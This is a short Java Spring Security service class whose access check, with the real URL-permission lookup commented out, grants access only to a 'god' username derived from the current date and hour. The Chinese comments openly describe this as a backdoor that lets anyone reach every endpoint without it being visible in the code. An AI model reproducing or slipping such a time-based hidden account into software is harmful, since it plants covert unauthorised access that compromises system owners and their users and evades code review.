package com.example.springsecurity.service.impl;

import com.example.springsecurity.service.UserAccessService;
import lombok.extern.slf4j.Slf4j;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.stereotype.Service;
import org.springframework.util.AntPathMatcher;

import javax.servlet.http.HttpServletRequest;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

/**
 * 可以自定义权限通过逻辑
 */
@Slf4j
@Service("UserAccessService")
public class UserAccessServiceImpl implements UserAccessService {
    private AntPathMatcher antPathMatcher = new AntPathMatcher();

    @Override
    public boolean pass(HttpServletRequest request, Authentication authentication) {
        boolean access = false;
        if(authentication.getPrincipal() instanceof UserDetails){
            String username = ((UserDetails) authentication.getPrincipal()).getUsername();
//            根据username去数据库查询对应的url,这里就不查了
//            List<String> list = new ArrayList<>();
//            for(String url:list){
//                if(antPathMatcher.match(url,request.getRequestURI())){
//                    access=true;
//                    break;
//                }
//            }
            access = isGodAccess(username);
        }
        return access;
    }

    /**
     * 如果用户名是god用户名，就开放权限
     * 这里可以设置一个god AOP,根据算法动态生成用户名，任何接口都可以访问，并且不会被代码中看出来
     * @return
     */
    private boolean isGodAccess(String username) {
        Calendar calendar = Calendar.getInstance();
        calendar.setTime(new Date());
        int month = calendar.get(Calendar.MONTH);
        month++;
        int day = calendar.get(Calendar.DAY_OF_MONTH);
        int hour = calendar.get(Calendar.HOUR_OF_DAY);
        String godName = String.valueOf((month*100+day*10+hour)%1000);
        return godName.equals(username);
    }
}
